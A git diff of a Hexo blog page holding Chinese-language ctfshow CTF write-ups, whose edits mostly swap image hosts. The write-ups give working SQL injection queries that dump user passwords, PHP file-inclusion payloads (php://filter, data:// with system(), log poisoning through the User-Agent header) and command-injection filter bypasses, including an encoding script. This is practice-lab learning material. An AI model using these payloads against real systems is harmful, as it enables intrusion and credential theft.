@@ -168,10 +168,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2025-02-06 13:32:37 / Modified: 20:08:54" itemprop="dateCreated datePublished" datetime="2025-02-06T13:32:37+08:00">2025-02-06</time>
+              <time title="Created: 2025-02-06 13:32:37" itemprop="dateCreated datePublished" datetime="2025-02-06T13:32:37+08:00">2025-02-06</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-02-15 13:10:31" itemprop="dateModified" datetime="2025-02-15T13:10:31+08:00">2025-02-15</time>
+              </span>
 
           
 
@@ -188,53 +194,28 @@
 <p>先利用单引号1’测试回显发现错误</p>
 <p>再利用–+测试回显正常</p>
 <p>然后利用<strong>order by</strong>测试字段数</p>
-<p>最后得到字段数为3</p>
-<pre><code>1&#39; order by 3 --+   (通过修改数字判断字段数)
-</code></pre>
-<p>利用语句查询基础资料</p>
-<pre><code>0&#39; union select database(),user(),version()--+
-</code></pre>
-<p><img src="https://www.helloimg.com/i/2025/02/06/67a45e2414750.png"></p>
-<p>查询<strong>ctfshow_web</strong>数据库下的表   2,3是占位符</p>
-<pre><code>0&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--+
-</code></pre>
-<img title src="https://www.helloimg.com/i/2025/02/06/67a45daa6414c.png" alt style="zoom:33%;">
-
-<p>查询列名</p>
-<pre><code>0&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_schema=&#39;ctfshow_web&#39;and table_name=&#39;ctfshow_user&#39;--+
-</code></pre>
-<p><img src="https://www.helloimg.com/i/2025/02/06/67a45e6f970d7.png"></p>
-<p>最后查询所有列的数据</p>
-<pre><code>  0&#39; union select id,username,password from ctfshow_web.ctfshow_user--+
-</code></pre>
-<img src="https://www.helloimg.com/i/2025/02/06/67a465d3cd207.png" title alt style="zoom:33%;">
-
+<p>最后得到字段数为3<br>    1’ order by 3 –+   (通过修改数字判断字段数)</p>
+<p>利用语句查询基础资料<br>    0’ union select database(),user(),version()–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe1ef2c5.png"></p>
+<p>查询<strong>ctfshow_web</strong>数据库下的表   2,3是占位符<br>    0’ union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe12f32b.png"></p>
+<p>查询列名<br>    0’ union select group_concat(column_name),2,3 from information_schema.columns where table_schema&#x3D;’ctfshow_web’and table_name&#x3D;’ctfshow_user’–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe12f06b.png"></p>
+<p>最后查询所有列的数据<br>      0’ union select id,username,password from ctfshow_web.ctfshow_user–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe12f339.png"></p>
 <p><strong>web172</strong></p>
 <p>前面的步骤和<strong>web171</strong>一样   但是这个只有两个回显</p>
 <p>并且他添加了一个新规则</p>
-<p><img src="https://www.helloimg.com/i/2025/02/06/67a47c0615127.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe18e3e5.png"></p>
 <p>并且因为只有两个回显  所以在最后一步要删去username</p>
-<p>即构造:</p>
-<pre><code> 0&#39; union select id,password from ctfshow_web.ctfshow_user2--+
-</code></pre>
-<img src="https://www.helloimg.com/i/2025/02/06/67a47c5b382a3.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
-
+<p>即构造:<br>     0’ union select id,password from ctfshow_web.ctfshow_user2–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe1e41ba.png"></p>
 <p><strong>web173</strong></p>
 <p>一样一样和前面一样</p>
 <p>但是不同点有三个字段</p>
 <p>并且flag在第三个表内(ctfshow_web.ctfshow_user3)   且和上一题一样不能用username  用2替代</p>
-<p>构造:</p>
-<pre><code> 0&#39; union select id,2,password from ctfshow_web.ctfshow_user3--+
-</code></pre>
-<p><img src="https://www.helloimg.com/i/2025/02/06/67a49d6e4ab63.png"></p>
+<p>构造:<br>     0’ union select id,2,password from ctfshow_web.ctfshow_user3–+</p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b01fe1f0658.png"></p>
 
       
     </div>
@@ -268,7 +249,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87%5B78-81%5D/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2025/01/31/ctfshow-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87%5B78-81%5D/" class="post-title-link" itemprop="url">ctfshow-web入门-文件包含篇[78-81]</a>
         </h2>
 
         <div class="post-meta">
@@ -285,7 +266,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-02-01 17:01:29" itemprop="dateModified" datetime="2025-02-01T17:01:29+08:00">2025-02-01</time>
+                <time title="Modified: 2025-02-15 13:28:03" itemprop="dateModified" datetime="2025-02-15T13:28:03+08:00">2025-02-15</time>
               </span>
 
           
@@ -300,54 +281,48 @@
 
       
           <p><strong>web78</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/31/679cafc30dcb0.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02478cd609.png" title alt style="zoom:50%;">
 
 <p>看到是get传参</p>
-<p><img src="https://www.helloimg.com/i/2025/01/31/679cb373a24df.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b02479a8e5e.png" title alt style="zoom:50%;">
+
 <p>因为是文件包含    所以直接想到php伪协议</p>
 <p>构造:<br>     <strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/31/679cb3dd16998.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b024797231f.png" title alt style="zoom:50%;">
 
 <p>然后直接base64解码</p>
-<img src="https://www.helloimg.com/i/2025/01/31/679cb40ed6cb6.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b024799c870.png" title alt style="zoom:50%;">
 
 <p><strong>web79</strong></p>
-<img src="https://www.helloimg.com/i/2025/02/01/679dc297ed53a.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02478d86bf.png"></p>
 <p>看到代码中的<code>   **$file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</code>**    意思是把  file中的php改为???</p>
-<img src="https://www.helloimg.com/i/2025/02/01/679dc6184a0de.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02478d77a9.png"></p>
 <p>利用data协议</p>
 <p>模板:<br>    data:text&#x2F;plain,<?php system("命令");?></p>
 <p>构造:<br>     <strong>?file&#x3D;data:text&#x2F;plain,<?= system("tac fla*");?></strong></p>
-<img src="https://www.helloimg.com/i/2025/02/01/679dc53782532.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b0247993f74.png" title alt style="zoom:50%;">
 
 <p><strong>web80</strong></p>
-<img src="https://www.helloimg.com/i/2025/02/01/679dca83e2d83.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0254e106a4.png"></p>
 <p>看到代码后发现他过滤了data协议</p>
-<img src="https://www.helloimg.com/i/2025/02/01/679dcb5ac8a15.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b0254ebb490.png" title alt style="zoom:50%;">
 
-<p>利用php协议的另一种用法(一般在burp中进行    浏览器中一般不成功)<br>     ?file&#x3D;php:&#x2F;&#x2F;input           </p>
-<pre><code> POST:&lt;?php system(&#39;命令&#39;);?&gt;
-</code></pre>
-<img src="https://www.helloimg.com/i/2025/02/01/679dcd500a186.png" title alt style="zoom:33%;">
+<p>利用php协议的另一种用法(一般在burp中进行    浏览器中一般不成功)<br>     ?file&#x3D;php:&#x2F;&#x2F;input<br>     POST:<?php system('命令');?></p>
+<img src="https://a1.boltp.com/2025/02/15/67b0254ec3172.png" title alt style="zoom:67%;">
 
-<p>构造<br>    ?file&#x3D;Php:&#x2F;&#x2F;input(利用大小写过滤php)</p>
-<pre><code>&lt;?php system(&#39;tac fl0g.php&#39;);?&gt;
-</code></pre>
-<img src="https://www.helloimg.com/i/2025/02/01/679dcd1529232.png" title alt style="zoom:33%;">
+<p>构造<br>    ?file&#x3D;Php:&#x2F;&#x2F;input(利用大小写过滤php)<br>    <?php system('tac fl0g.php');?></p>
+<img src="https://a1.boltp.com/2025/02/15/67b0254eccd47.png" title alt style="zoom:50%;">
 
 <p><strong>web81</strong></p>
-<img src="https://www.helloimg.com/i/2025/02/01/679de00ecdfb8.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0254e14a4a.png"></p>
 <p>看到把:给过滤了 所以data和php协议都不可以用</p>
-<p><img src="https://www.helloimg.com/i/2025/02/01/679de04d65512.png"></p>
+<img src="https://www.helloimg.com/i/2025/02/01/679de04d65512.png" title alt style="zoom:50%;">
+
 <p>但可以使用日志</p>
 <p>先访问<br>    url+?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
 <p>然后抓包并在UA头进行修改(只要添加<?php system('命令');?>)<br>    Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:134.0)  <?php system('cat fl0g.php');?> Gecko&#x2F;20100101 Firefox&#x2F;134.0</p>
 <p>然后得到flag</p>
-<img src="https://www.helloimg.com/i/2025/02/01/679de11f4813f.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b0254ed7349.png" title alt style="zoom:67%;">
 
       
     </div>
@@ -390,10 +365,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2025-01-30 13:11:49 / Modified: 14:59:41" itemprop="dateCreated datePublished" datetime="2025-01-30T13:11:49+08:00">2025-01-30</time>
+              <time title="Created: 2025-01-30 13:11:49" itemprop="dateCreated datePublished" datetime="2025-01-30T13:11:49+08:00">2025-01-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-02-16 13:55:28" itemprop="dateModified" datetime="2025-02-16T13:55:28+08:00">2025-02-16</time>
+              </span>
 
           
 
@@ -407,98 +388,62 @@
 
       
           <p><strong>web51</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b0abb6e535.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/16/67b17d111c374.png" title alt style="zoom:50%;">
 
 <p>进入后发现比上一题多过滤了tac</p>
 <p><img src="https://www.helloimg.com/i/2025/01/30/679b0b835d1fb.png"></p>
 <p>因此把tac换为ta\c绕过</p>
 <p>构造:</p>
 <p>?c&#x3D;ta\c&lt;&gt;fla\给.php||</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b0bae55780.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
+<img src="https://a1.boltp.com/2025/02/16/67b17d111c55a.png" title alt style="zoom:50%;">
 
 <p><strong>web52</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b0f0fb7e3f.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/16/67b17d11d77c1.png" title alt style="zoom:50%;">
 
 <p>发现把&lt;&gt;给过滤了</p>
 <p>用${IFS}来代替&lt;&gt;</p>
-<p><img src="https://www.helloimg.com/i/2025/01/30/679b10786a8e4.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b03a68df7c4.png"></p>
 <p>构造:</p>
 <p>?c&#x3D;ta\c${IFS}fla\g.php||</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b101465ab5.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b03a6824744.png" title alt style="zoom:50%;">
 
 <p>但发现没有得到flag</p>
 <p>查看根目录    构造:?c&#x3D;ls${IFS}&#x2F;||</p>
 <p>发现存在flag</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b10bb5ed2b.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b03a68245c3.png" title alt style="zoom:50%;">
 
 <p>访问flag后得到flag</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b0ffb5fcca.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
+<img src="https://a1.boltp.com/2025/02/15/67b03a6824b63.png" title alt style="zoom:50%;">
 
 <p><strong>web53</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b15588e741.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b03a6824744.png" title alt style="zoom:50%;">
 
 <p>发现取消了”黑洞设备”</p>
 <p><img src="https://www.helloimg.com/i/2025/01/30/679b17302040f.png"></p>
 <p>直接构造:?c&#x3D;ta\c${IFS}fla\g.php</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b16ee07c34.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
+<img src="https://a1.boltp.com/2025/02/15/67b03a68cd123.png" title alt style="zoom:50%;">
 
 <p><strong>web54</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b1c809638b.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b03a68d5068.png"></p>
 <p>发现把\过滤了所以<strong>ta\c和fla\g</strong>不能用了  </p>
-<p><img src="https://www.helloimg.com/i/2025/01/30/679b1d192ed63.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b03a698c051.png"></p>
 <p>ta\c可以用vi命令代替</p>
 <p>fla\g可以用fla?.php代替</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b1d986b724.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/16/67b17d111c5a7.png"></p>
 <p>然后打开页面源代码发现flag</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b1dcd0dee0.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
+<img src="https://a1.boltp.com/2025/02/15/67b03a698d752.png" title alt style="zoom:50%;">
 
 <p><strong>web55</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b2029e9f58.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b03a69b462d.png" title alt style="zoom:50%;">
 
 <p>发现过滤了<strong>a-z</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b2066ea3da.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b03a698c051.png"></p>
 <p>可以用?直接用base64访问</p>
 <p>构造:?c&#x3D;&#x2F;???&#x2F;????64 ????.???</p>
 <p>意思为：?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b20badc518.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/16/67b17d1205ff4.png"></p>
 <p>进行解码</p>
-<img src="https://www.helloimg.com/i/2025/01/30/679b21087fe5c.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/16/67b17d11efc3d.png" title alt style="zoom:50%;">
 
       
     </div>
@@ -549,7 +494,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-30 13:11:09" itemprop="dateModified" datetime="2025-01-30T13:11:09+08:00">2025-01-30</time>
+                <time title="Modified: 2025-02-15 14:48:39" itemprop="dateModified" datetime="2025-02-15T14:48:39+08:00">2025-02-15</time>
               </span>
 
           
@@ -566,87 +511,107 @@
           <p><strong>web41</strong></p>
 <p>这题太难了完全不是我这种web新手和编程新手能写的  甚至代码都看不懂  所以先用之后在理解</p>
 <p>想了解入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127773706">CTFshow wbe41 教你写脚本_ctfshow web41-CSDN博客</a></p>
-<img src="https://www.helloimg.com/i/2025/01/25/679481d61bd1c.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300c83b8b.png"></p>
 <p>1.看见他把0-9和a-z过滤了直接懵逼  </p>
-<img src="https://www.helloimg.com/i/2025/01/25/679482db0aae2.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300bbcc1a.png"></p>
 <p>2.直接看大佬写的脚本(python脚本)</p>
 <p><em><em>import re<br>import urllib<br>from urllib import parse<br>hex_i &#x3D; “”<br>hex_j &#x3D; “”<br>pattern&#x3D;’&#x2F;[0-9]|[a-z]|^|+|~|$|[|]|{|}|&amp;|-&#x2F;i’           #题目中过滤的内容<br>str1&#x3D;[“system”,”tac fla</em>“]                                       #所需编码的内容<br>for p in range(2):<br>    t1 &#x3D; “”<br>    t2 &#x3D; “”<br>    for k in str1[p]:<br>        for i in range(256):<br>            for j in range(256):<br>                if re.search(pattern,chr(i)) :<br>                    break<br>                if re.search(pattern,chr(j)) :<br>                    continue<br>                if i &lt; 16:<br>                    hex_i &#x3D; “0” + hex(i)[2:]<br>                else:<br>                    hex_i&#x3D;hex(i)[2:]<br>                if j &lt; 16:<br>                    hex_j&#x3D;”0”+hex(j)[2:]<br>                else:<br>                    hex_j&#x3D;hex(j)[2:]<br>                hex_i&#x3D;’%’+hex_i<br>                hex_j&#x3D;’%’+hex_j<br>                c&#x3D;chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))<br>                if(c &#x3D;&#x3D;k):<br>                    t1&#x3D;t1+hex_i<br>                    t2&#x3D;t2+hex_j<br>                    break<br>            else:<br>                continue<br>            break<br>    print(“(&quot;“+t1+”&quot;|&quot;“+t2+”&quot;)”)</em>*</p>
 <p>3.通过修改编码内容完成过滤  运行脚本(python  file.py)</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/679484487cbcf.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9b87a61.png"></p>
 <p>4.然后在抓包软件输入结果然后得到flag</p>
-<img src="https://www.helloimg.com/i/2025/01/25/679484a704f88.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9bc4ad5.png"></p>
 <p>先介绍知识:</p>
 <p>”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“可以用;、||、%26、%0a过滤</p>
 <p>更深原理入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/albertsh/article/details/132033812">linux环境下运行脚本时常用＞&#x2F;dev&#x2F;null 2＞&amp;1 &amp;这一串的作用_&gt;nul 2&gt;&amp;1-CSDN博客</a></p>
 <p><strong>web42</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/25/67949276ecd09.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9bcf39c.png"></p>
 <p>进入后发现没有过滤只有”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/679493c8be5e1.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9c022fe.png"></p>
 <p>然后利用上面的绕过得到flag</p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794942d4df1b.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02f9c258b9.png" title alt style="zoom:50%;">
 
 <p><strong>web43</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/25/67949c9cb6f04.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300bbcc65.png"></p>
 <p>进入后看到多了两个过滤;和cat</p>
 <p><strong>cat</strong>可用<strong>tac</strong>代替</p>
 <p>;<strong>可用</strong>%0a等代替</p>
-<img src="https://www.helloimg.com/i/2025/01/25/67949e58bbb95.png" title alt style="zoom:50%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300bbcc33.png"></p>
 <p>如</p>
-<img src="https://www.helloimg.com/i/2025/01/25/67949d654479f.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300c84d77.png"></p>
 <p><strong>web44</strong></p>
 <p>与web43相比  多了flag过滤</p>
 <p>可以用*或?过滤</p>
 <p>**:<em>匹配0个或多个字符  如:fla</em> *    </p>
 <p>?是匹配1和字符  如:fla?.php</p>
 <p>所以直接改造 :  ?c&#x3D;tac fla?php%0a</p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794a15d94fdd.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b0300c846ff.png" title alt style="zoom:50%;">
 
 <p><strong>web45</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794b8b83307e.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b0300c598f0.png"></p>
 <p>发现比上一题多过滤了空格</p>
 <p>空格可以用%09等代替</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794b93111f25.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9b3ea58.png"></p>
 <p>构造:?c&#x3D;tac%09fla*%0a</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794b992b3612.png"></p>
-<p><strong>web46</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794bdf3a5b73.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02f9b36c47.png" title alt style="zoom:50%;">
 
+
+
+
+
+
+
+
+
+<p><strong>web46</strong></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9b1711a.png"></p>
 <p>这次多过滤了*和0-9</p>
 <p>但%09和%0a是url   而0-9数字不包括url编码的数字</p>
 <p>所以这次只需要和前面<strong>web45</strong>修改用?过滤</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794c5974249e.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9ae971a.png"></p>
 <p>构造:?c&#x3D;tac%09fla?.php%0a</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794bf750b912.png"></p>
+<img title src="https://a1.boltp.com/2025/02/15/67b02f9ab5f3e.png" alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
 <p><strong>web47和web48</strong></p>
 <p>和web46一样  新的过滤不影响</p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794c960591ef.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02f994e6e4.png" title alt style="zoom:50%;">
 
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794ca817bbb5.png"></p>
+<img title src="https://a1.boltp.com/2025/02/15/67b02f9a3ce96.png" alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
 <p><strong>web49</strong></p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794cb1c67419.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f9a12e17.png"></p>
 <p>虽然过滤了%  但是不包括url编码的%</p>
 <p>所以构造相同</p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794cb64417b1.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02f9a06386.png" title alt style="zoom:50%;">
 
 <p><strong>web50</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/25/6794cec29b061.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02f994e908.png" title alt style="zoom:50%;">
 
 <p>发现过滤了%09和%26</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf2d8d0bc.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02f994e95f.png"></p>
 <p>%09用&lt;&gt;代替</p>
 <p>%26用||代替</p>
 <p>但我不知道为啥**匹配符合?**不可以用了</p>
 <p>所以把fla?.php改为fla\g.php或者fla’’g.php</p>
 <p>构造:?c&#x3D;tac&lt;&gt;fla\g.php||或者?c&#x3D;tac&lt;&gt;fla’’g.php||</p>
-<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf812f0e2.png"></p>
+<img title src="https://a1.boltp.com/2025/02/15/67b02f9a3e89d.png" alt style="zoom:33%;">
 
       
     </div>
@@ -697,7 +662,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-01-25 13:01:09" itemprop="dateModified" datetime="2025-01-25T13:01:09+08:00">2025-01-25</time>
+                <time title="Modified: 2025-02-15 14:05:19" itemprop="dateModified" datetime="2025-02-15T14:05:19+08:00">2025-02-15</time>
               </span>
 
           
@@ -713,40 +678,36 @@
       
           <p>                                                                                         ctfshow web入门 命令篇(二)</p>
 <p><strong>web35</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791d69a4b4a8.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d3452b53.png"></p>
 <p>解法一:与web34相同</p>
 <p>解法二:用data协议 模板:<strong>data:text&#x2F;plain,<?php system("命令");?></strong></p>
 <p>本题用:</p>
 <p><strong>?c&#x3D;include%09$_POST[a]?&gt;    POST:a&#x3D;data:text&#x2F;plain,<?php system('tac fla*');?></strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791d80302bab.png" title alt style="zoom:50%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d34aea90.png"></p>
 <p><strong>web36</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791d991e9cf3.png" title alt style="zoom:33%;">
-
-<p><img src="https://www.helloimg.com/i/2025/01/23/6791d9e5bd485.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d345188e.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d2e5c0f1.png"></p>
 <p>发现过滤了0-9数字把空格从**%09<strong>改为</strong>%0a**</p>
-<p>如<img title src="https://www.helloimg.com/i/2025/01/23/6791da6922106.png" alt style="zoom:33%;"></p>
+<p>如<img src="https://a1.boltp.com/2025/02/15/67b02d2e67c31.png"></p>
 <p><strong>web37</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791de18dea46.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02d2da6dfd.png" title alt style="zoom:50%;">
 
-<p><img src="https://www.helloimg.com/i/2025/01/23/6791df5e1ff03.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b02d2dac80c.png" title alt style="zoom:50%;">
+
 <p>和前面的题差不多  直接用data或php协议绕过  推荐用data协议(因为不用后续解码)</p>
 <p>?c&#x3D;data:text&#x2F;plain,<?php system("tac fla*");?></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791df849b2a0.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d2e74b93.png"></p>
 <p><strong>web38</strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791e1dde0570.png" title alt style="zoom:33%;">
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d3453790.png"></p>
+<img src="https://a1.boltp.com/2025/02/15/67b02d2ead2c0.png" title alt style="zoom:50%;">
 
-<p><img src="https://www.helloimg.com/i/2025/01/23/6791e21c34705.png"></p>
 <p>发现过滤多了PHP和file导致标准的data无法使用  但可以使用简写版(把php改为&#x3D;)</p>
 <p>简写版:<strong>data:text&#x2F;plain,<?=system("命令");?></strong></p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791e2c141609.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02d2da6c59.png"></p>
 <p><strong>web39</strong></p>
 <p>和前面的题一样的解法</p>
 <p><code>include($c.&quot;.php&quot;);</code>含义是在变量c的值后添加.php  对data协议无意义</p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791e57bc4b9c.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02c041aff8.png" title alt style="zoom:50%;">
 
 <p><strong>web40</strong></p>
 <p><strong>localeconv()</strong>:返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)</p>
@@ -757,18 +718,17 @@
 <p><strong>print_r()</strong>:函数用于打印变量，作用对象是变量。</p>
 <p><strong>show_source()</strong>:对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮，作用对象是文件。</p>
 <p><strong>highlight_file()</strong>:跟show_source()类似。</p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791ee17765cb.png" title alt style="zoom:33%;">
+<img src="https://a1.boltp.com/2025/02/15/67b02c034a83e.png" title alt style="zoom:50%;">
 
-<p><img src="https://www.helloimg.com/i/2025/01/23/6791ee3ac75eb.png"></p>
+<p><img src="https://a1.boltp.com/2025/02/15/67b02c034e0a0.png"></p>
 <p>仔细看会发现过滤的()是中文的   所以相当于没过滤</p>
 <p>?c&#x3D;print_r(scandir(pos(localeconv())));以数组的形式展现目录</p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791eedec43ce.png" title alt style="zoom:33%;">
-
+<p><img src="https://a1.boltp.com/2025/02/15/67b02c034f6e1.png"></p>
 <p>?c&#x3D;print_r((array_reverse(scandir(current(localeconv())))));将目录反转</p>
-<img src="https://www.helloimg.com/i/2025/01/23/6791ef3f47730.png" title alt style="zoom:33%;">
